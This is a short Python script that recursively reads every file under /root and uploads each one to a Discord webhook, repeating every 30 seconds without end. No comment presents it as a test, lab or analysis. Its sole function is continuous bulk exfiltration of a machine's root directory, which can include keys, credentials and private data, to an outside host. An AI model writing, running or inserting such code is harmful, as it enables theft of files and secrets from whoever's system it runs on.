import os
import requests
import time

# Discord webhook URL
WEBHOOK_URL = ""

# Directory to monitor
MONITORED_DIR = "/root"

def get_files_in_directory(directory):
    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            files.append(os.path.join(root, filename))
    return files

def send_files_to_discord(files):
    for file_path in files:
        try:
            with open(file_path, "rb") as file:
                file_content = file.read()
            file_name = os.path.basename(file_path)
            payload = {
                "content": f"File: {file_name}",
                "file": (file_name, file_content)
            }
            response = requests.post(WEBHOOK_URL, files=payload)
            if response.status_code == 200:
                print(f"File sent successfully: {file_name}")
            else:
                print(f"Failed to send file: {file_name}, HTTP {response.status_code}")
        except Exception as e:
            print(f"Error sending file {file_name}: {e}")

def main():
    while True:
        files = get_files_in_directory(MONITORED_DIR)
        send_files_to_discord(files)
        time.sleep(30)  # Wait for 30 seconds before checking again

if __name__ == "__main__":
    main()
